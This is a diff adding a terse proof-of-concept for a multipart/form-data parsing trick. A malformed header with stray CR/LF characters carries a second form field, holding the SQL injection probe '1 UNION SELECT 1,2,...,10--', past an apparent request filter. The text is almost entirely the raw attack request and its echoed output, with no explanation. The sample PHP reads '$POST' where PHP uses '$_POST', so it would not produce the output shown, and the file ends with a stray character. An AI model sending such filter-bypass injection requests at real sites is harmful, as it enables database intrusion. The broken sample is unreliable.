@@ -1,0 +1,32 @@
+Proof of concept:
+-----------------
+
+wut.php:
+--------
+
+<? echo $POST[xxx] ?>
+
+
+POST request:
+-------------
+
+POST /wut.php HTTP/1.1
+Content-Type: multipart/form-data; boundary=A
+Content-Length: 161
+
+--A
+Content-Disposition: form-data; name="xxx"[\r][\r][\n]
+--A
+Content-Disposition: form-data; name="yyy"; filename="z"
+
+1 UNION SELECT 1,2,3,4,5,6,7,8,9,10--
+
+--A--
+
+
+Output:
+-------
+
+1 UNION SELECT 1,2,3,4,5,6,7,8,9,10--
+
+(any change in the header should produce a 403)d
